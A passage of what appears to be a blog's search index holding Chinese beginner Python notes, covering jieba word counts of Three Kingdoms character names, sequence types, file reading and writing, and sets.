class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jieba<br><br>txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\python\学习资料\文本/threekingdoms.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).read()<br>words = jieba.lcut(txt)  <span class="hljs-comment"># 精确模式</span><br>counts = &#123;&#125;<br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(word) == <span class="hljs-number">1</span>:  <span class="hljs-comment"># 单个词语不计算在内</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        counts[word] = counts.get(word, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>items = <span class="hljs-built_in">list</span>(counts.items())<br>items.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    word, count = items[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="hljs-built_in">format</span>(word, count))<br></code></pre></td></tr></table></figure><ul><li>会出现非人名，或者不同称谓都是指一个人的情况</li></ul><img src="/2022/02/16/jieba%E5%BA%93/jieba2.jpg" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jieba<br><br>excludes = &#123;<span class="hljs-string">&quot;将军&quot;</span>, <span class="hljs-string">&quot;却说&quot;</span>, <span class="hljs-string">&quot;荆州&quot;</span>, <span class="hljs-string">&quot;二人&quot;</span>, <span class="hljs-string">&quot;不可&quot;</span>, <span class="hljs-string">&quot;不能&quot;</span>, <span class="hljs-string">&quot;如此&quot;</span>&#125;<br>txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\python\学习资料\文本/threekingdoms.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).read()<br>words = jieba.lcut(txt)<br>counts = &#123;&#125;<br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(word) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">elif</span> word == <span class="hljs-string">&quot;诸葛亮&quot;</span> <span class="hljs-keyword">or</span> word == <span class="hljs-string">&quot;孔明曰&quot;</span>:  <span class="hljs-comment"># 根据上例的运行结果对代码进行修改</span><br>        rword = <span class="hljs-string">&quot;孔明&quot;</span><br>    <span class="hljs-keyword">elif</span> word == <span class="hljs-string">&quot;关公&quot;</span> <span class="hljs-keyword">or</span> word == <span class="hljs-string">&quot;云长&quot;</span>:<br>        rword = <span class="hljs-string">&quot;关羽&quot;</span><br>    <span class="hljs-keyword">elif</span> word == <span class="hljs-string">&quot;玄德&quot;</span> <span class="hljs-keyword">or</span> word == <span class="hljs-string">&quot;玄德曰&quot;</span>:<br>        rword = <span class="hljs-string">&quot;刘备&quot;</span><br>    <span class="hljs-keyword">elif</span> word == <span class="hljs-string">&quot;孟德&quot;</span> <span class="hljs-keyword">or</span> word == <span class="hljs-string">&quot;丞相&quot;</span>:<br>        rword = <span class="hljs-string">&quot;曹操&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        rword = word<br>    counts[rword] = counts.get(rword, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> excludes:<br>    <span class="hljs-keyword">del</span> counts[word]<br>items = <span class="hljs-built_in">list</span>(counts.items())<br>items.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    word, count = items[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="hljs-built_in">format</span>(word, count))<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Python基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>序列类型</title>
    <link href="/2022/02/16/%E5%BA%8F%E5%88%97%E7%B1%BB%E5%9E%8B/"/>
    <url>/2022/02/16/%E5%BA%8F%E5%88%97%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1>序列类型</h1><h3 id="序列类型概念">序列类型概念</h3><ul><li>序列是具有先后关系的一组元素</li><li>序列是一维向量，元素类型可以不同</li><li>可以通过下标访问序列的特定元素</li><li>序列是一个基类类型</li></ul><h3 id="序列类型通用操作符">序列类型通用操作符</h3><ul><li><p>x in s</p></li><li><p>x not in s</p></li><li><p>s + t     --&gt;连接连个序列</p></li><li><p>s*n      --&gt;复制n次</p></li><li><p>n*s      --&gt;复制n次</p></li><li><p>s[ i ]     --&gt;索引</p></li><li><p>s[ i : j ]、s[ i : j : k ]   注意：[i , j)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 相当于倒序</span><br>ls = [<span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;.io&#x27;</span>]<br>ls = ls[::-<span class="hljs-number">1</span>]<br>--&gt;[<span class="hljs-string">&#x27;.io&#x27;</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;python&#x27;</span>]<br>s = <span class="hljs-string">&#x27;python123.io&#x27;</span><br>s = s[::-<span class="hljs-number">1</span>]<br>--&gt;oi<span class="hljs-number">.321</span>nohtyp通用函数和方法<br></code></pre></td></tr></table></figure></li></ul><h3 id="通用函数和方法">通用函数和方法</h3><ul><li>len(s)</li><li>min(s)</li><li>max(s)</li><li>s.index(i)</li><li>s.index(x , i , j )     返回序列s从i开始到j位置中第一次出现元素x的位置</li><li>s.count(x)</li></ul><h4 id="元组">元组( )</h4><ul><li>一旦创建便<strong>不可修改</strong>，也因此没有特殊操作</li><li>创建：()、tuple()，元素间用逗号分隔</li><li>可以使用或不使用小括号</li><li>注意：如果元组中只有<strong>一个</strong>元素，必须加<strong>逗号</strong>， 如t=(‘A’)为str类型，t=(‘A’,)为元组</li><li>有下标和切片</li><li>排序：sorted(t)，返回的为<strong>列表</strong>类型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span> * <span class="hljs-number">20</span>)<br>creature = <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span><br><span class="hljs-built_in">print</span>(creature)<br>color = (<span class="hljs-string">&#x27;blue&#x27;</span>, creature)<br><span class="hljs-built_in">print</span>(color)<br>--&gt;(<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>)<br>--&gt;(<span class="hljs-string">&#x27;blue&#x27;</span>, (<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>))<br></code></pre></td></tr></table></figure><h4 id="列表">列表[ ]</h4><ul><li><p>创建后可以随意修改</p></li><li><p>创建：[]、list()，元素间用逗号分隔</p><p>​a[]、a[’ ’ , ’ ’ , ’ ']、a[ [ ] , [ ] , [ ]]</p></li><li><p>元素中各元素类型不同，无长度限制</p></li><li><p>特别的操作函数和方法</p><p>del ls[i]</p><p>del ls[i : j : k ]</p><p>ls.append()  在列表<strong>最后</strong>增加一个元素x</p><p>ls.clear()  删除列表中的<strong>所有</strong>元素</p><p>ls.copy()</p><p>ls.insert(i ,x )  在列表中第i位置增加元素x，其他元素后移</p><p>ls.pop(i)   将列表中第i位置元素删除元素x</p><p>ls.pop()    从后往前删</p><p>ls.remove(x)  将列表中出现的<strong>第一个</strong>元素x删除</p><p>​用循环和remove删除元素时要注意下标的改变，否则易出现漏删的情况</p><p>ls.reverse()    将列表中的元素<strong>反转</strong></p><p>ls2.extend(ls1)  列表<strong>相加</strong></p><p>ls.sort()   默认<strong>升序</strong>，可以通过reverse控制升序和降序，Ture降序（默认）<br>ls.sort(reverse=Ture)   <strong>降序</strong></p><ul><li><p>注意</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">sort 与 <span class="hljs-built_in">sorted</span> 区别：<br>sort 是应用在 <span class="hljs-built_in">list</span> 上的方法<br><span class="hljs-built_in">sorted</span> 可以对所有可迭代的对象进行排序操作。<br><span class="hljs-built_in">list</span> 的 sort 方法返回的是对已经存在的列表进行操作，而内建函数 <span class="hljs-built_in">sorted</span> 方法返回的是一个新的 <span class="hljs-built_in">list</span>，而不是在原来的基础上进行的操作。<br></code></pre></td></tr></table></figure></li></ul></li><li><p>列表推导式：最终得到的是一个列表<br>格式1：[for i in 可迭代的]<br>格式2：[i for i in 可迭代的 if 条件]</p></li></ul><h3 id="字符串">字符串</h3><ul><li><p>查找内容:find,index,rfind,rindex<br>find : 从左向右找，只要遇到一个符合要求的就返回位置，如果没有找到任何符合要求的就返回-1</p></li><li><p>count : 统计指定字符的个数</p></li><li><p>index : 与find类似，但是找不到会报错</p></li><li><p>startswith(‘xxx’)  判断是否以xxx开头</p></li><li><p>endswith(‘xxx’)</p></li><li><p>isalpha()   是否全部是字母组成</p></li><li><p>isdigit()</p></li><li><p>isalnum(）</p></li><li><p>isspace()</p></li><li><p>issupper()  是否全部是大写</p></li><li><p>islower()</p></li><li><p>replace(old,new,count) 默认全部替换，也可以通过count指定次数</p></li><li><p>切割字符串：<br>split,rsplilt,splitlines,partition,rpartition<br>split(‘分隔符’,maxsplit) 返回的结果是一个列表，maxsplit为最多分割次数</p></li><li><p>修改大小写：capitalized、title、upper、lower<br>title()  每个单词的第一个字母大写<br>upper()   每个单词大写<br>capitalize()  第一个字母大写</p></li><li><p>空格处理：<br>ljust,rjust,center,  添加空格控制字符串的对齐方式<br>lstrip,rstrip,strip  删除空格<br>join  字符串拼接<br>list2=‘(想要用的连接符)’.join(list1)  拼接两个列表</p></li></ul><h3 id="序列类型应用场景">序列类型应用场景</h3><ul><li>元素遍历</li><li>数据保护：如果不希望数据被程序所修改，转换成元组类型</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件</title>
    <link href="/2022/02/15/%E6%96%87%E4%BB%B6/"/>
    <url>/2022/02/15/%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1>文件</h1><h3 id="文件的类型">文件的类型</h3><h6 id="文件的定义：">文件的定义：</h6><ul><li><p>文件是数据的抽象和集合</p></li><li><p>文件是存储在<strong>辅助存储器</strong>上的<strong>数据序列</strong></p></li><li><p>文件是数据存储的一种形式</p></li><li><p>文件展现形态：<strong>文本文件</strong>、<strong>二进制文件</strong>（本质上都是二进制形式存储）</p><ul><li><p>文本文件</p><p>由单一特定编码组成的文件（如UTF-8编码）</p><p>由于存在编码，也被看成是存储着的长字符串</p><p>.txt、.py</p></li><li><p>二进制文件</p><p>直接由比特0和1组成，没有统一字符编码</p><p>一般存在二进制0和1的组织结构，即文件格式</p><p>.png、.avi</p></li></ul></li></ul><span id="more"></span><h3 id="文件的打开和关闭">文件的打开和关闭</h3><h6 id="文件的打开">文件的打开</h6><ul><li><p>格式：&lt;变量名&gt; = open( &lt;文件路径&gt; , &lt;打开模式&gt;)</p><p>:small_blue_diamond:与源文件同目录可以省略路径</p><p>:small_blue_diamond:C:/…/…/xxx.txt、C: \ \ … \ \ … \ \ xxx.txt（python中 ’ \ '表示转义符）</p></li><li><p>打开</p><p>:one: r：只读，默认值，如果文件不存在，返回FileNotFoundError</p><p>:two: w：覆盖写，文件不存在则创建，存在则完全覆盖</p><p>:three: x：创建写，文件不存在则创建，存在则返回FileExitsError</p><p>:four: a：追加写，文件不存在则创建，存在则在文件最后追加内容</p><p>:five: b：二进制文件模式</p><p>:six: t：文本文件模式，默认值</p><p>:seven: +：与r/w/x/a一起使用，在原功能基础上增加同时读写功能</p><p>例：rt：只读、a+：追加写+读文件、wb：二进制+覆盖写</p></li><li><p>关闭</p><p>&lt;变量名&gt;.close( )</p></li></ul><h3 id="文件内容的读取">文件内容的读取</h3><ul><li>常用操作：</li></ul><p>:one: <filename>.read(size=-1)：读入<strong>全部</strong>内容，如果给出参数，读入长度为size</p><p>:two: <filename>.readline(size=-1)：读入<strong>一行</strong>内容，如果给出参数，读入长度为size</p><p>:three: <filename>.readlines(hint=-1)：读入<strong>所有行</strong>内容，以<strong>每行</strong>为一个元素形成<strong>列表</strong>，如果给出参数，读入行数为hint</p><ul><li><p>遍历方法</p><ul><li>一次读入，统一处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&quot;r&quot;</span>)<br>txt = file.read()<br>file.close()<br></code></pre></td></tr></table></figure><ul><li>（处理大文件）按数量读入，逐步处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&quot;r&quot;</span>)<br>txt = file.read(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">while</span> txt != <span class="hljs-string">&quot; &quot;</span>:<br>txt = file.read(<span class="hljs-number">2</span>)<br><br>file.close()<br></code></pre></td></tr></table></figure></li><li><p>文件的逐行操作</p><ul><li>逐行遍历(占内存)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&quot;r&quot;</span>)<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file.readlines():<br><span class="hljs-built_in">print</span>(line)<br><br>file.close()<br></code></pre></td></tr></table></figure><ul><li>分行读入，逐行处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(filename.<span class="hljs-string">&quot;r&quot;</span>)<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br><span class="hljs-built_in">print</span>(line)<br><br>file.close()<br></code></pre></td></tr></table></figure></li></ul><h3 id="数据的文件写入">数据的文件写入</h3><p>:one: <filename>.write(s)：向文件写入一个字符串或字节流</p><p>:two: <filename>.writelines(s)：将一个元素全为字符串的<strong>列表</strong>写入文件</p><p>:three: <filename>.seek(offset)：改变当前文件操作指针的位置</p><p>​      :small_blue_diamond:offset参数：0—&gt;文件开头；1—&gt;当前位置；2—&gt;文件结尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xxx.txt&quot;</span>.<span class="hljs-string">&quot;w+&quot;</span>)<br>ls = [<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>]<br><br>file.writelines(ls)<br><br>file.seek(<span class="hljs-number">0</span>)   <span class="hljs-comment"># 若无指针移动，则在写入后指针位于文件最后，打印为空</span><br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br><span class="hljs-built_in">print</span>(line)<br><br>file.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>集合</title>
    <link href="/2022/01/23/%E9%9B%86%E5%90%88/"/>
    <url>/2022/01/23/%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1>集合</h1><h3 id="集合类型的定义">集合类型的定义</h3><ul><li><p>集合是多个元素的无序组合</p></li><li><p>集合元素之间<strong>无序</strong>，每个元素<strong>唯一</strong>，不存在相同元素，<strong>没有下标</strong></p></li><li><p>集合元素不可更改，是<strong>不可变</strong>数据类型</p></li><li><p>集合用{}表示，元素间用逗号分隔</p><h3 id="集合的相关操作">集合的相关操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">建立:<br><span class="hljs-number">1</span>、建立含元素的集合<br>    A = &#123;<span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-number">123</span>, (<span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-number">123</span>)&#125;<br>    <span class="hljs-comment"># --&gt;&#123;123, &#x27;python&#x27;, (&#x27;python&#x27;, 123)&#125;</span><br>    <span class="hljs-number">2</span>、空集合用<span class="hljs-built_in">set</span>()<br>    B = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;python123&#x27;</span>)<br>    <span class="hljs-comment"># --&gt;&#123;&#x27;t&#x27;, &#x27;h&#x27;, &#x27;n&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;p&#x27;, &#x27;o&#x27;, &#x27;1&#x27;, &#x27;y&#x27;&#125;</span><br>    <span class="hljs-number">3</span>、<br>    C = &#123;<span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-number">123</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;python&#x27;</span>&#125;<br>        <span class="hljs-comment"># --&gt;&#123;123, &#x27;python&#x27;&#125;</span><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    元组等亦可以为集合中的一个元素</span><br><span class="hljs-string">    建立后打印，顺序不定</span><br><span class="hljs-string">    字符串的每个字符将会被拆开成单个集合元素，无序输出</span><br><span class="hljs-string">    建立时有重复元素，建立后自动去除</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>集合操作符：<br><span class="hljs-number">6</span>个操作符：<br>     <span class="hljs-number">1</span>、并：S | T，返回一个新集合，相当于s.union(t)<br>     <span class="hljs-number">2</span>、差：S - T，返回一个新集合，相当于s.difference(t)<br>     <span class="hljs-number">3</span>、交：S &amp; T，返回一个新集合，相当于s.intersection(t)<br>     <span class="hljs-number">4</span>、补：S ^ T，返回一个新集合，S和T中的非相同元素<br>     <span class="hljs-number">5</span>、判断S和T的子集关系：S &lt;= T 或 S &lt; T，返回 <span class="hljs-literal">True</span>/<span class="hljs-literal">False</span><br>     <span class="hljs-number">6</span>、判断S和T的包含关系：S &gt;= T 或 S &gt; T，返回 <span class="hljs-literal">True</span>/<span class="hljs-literal">False</span><br>    <span class="hljs-number">4</span>个增强操作符：<br>     <span class="hljs-number">1</span>、并：S |= T，更新S<br>     <span class="hljs-number">2</span>、差：S -= T，更新S<br>     <span class="hljs-number">3</span>、交：S &amp;= T，更新S<br>     <span class="hljs-number">4</span>、补：S ^= T，更新S<br>集合处理方法：<br>S.add(x)  <span class="hljs-comment"># 添加</span><br>    S.discard(x)  <span class="hljs-comment"># 移除，若x不在S中，不报错(do nothing)</span><br>    S.remove(x)   <span class="hljs-comment"># 移除，若x不在S中，报错，产生KeyError异常</span><br>    S.clear()  <span class="hljs-comment"># y移除S中所有元素</span><br>    S.pop()  <span class="hljs-comment"># 随机返回S的一个元素，更新S，若s为空则产生KeyError异常</span><br>    S.copy()  <span class="hljs-comment"># 返回集合S的一个副本</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="集合类型的应用场景">集合类型的应用场景</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>、包含关系的比较<br><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>&#125; <br><span class="hljs-number">2</span>、数据去重：集合类型所有元素无重复<br>ls = [<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">123</span>]  <span class="hljs-comment"># 列表</span><br>    s = <span class="hljs-built_in">set</span>(ls)  <span class="hljs-comment"># 利用集合无重复元素的特点</span><br>    lt = <span class="hljs-built_in">list</span>(s)  <span class="hljs-comment"># 重新转换为列表</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
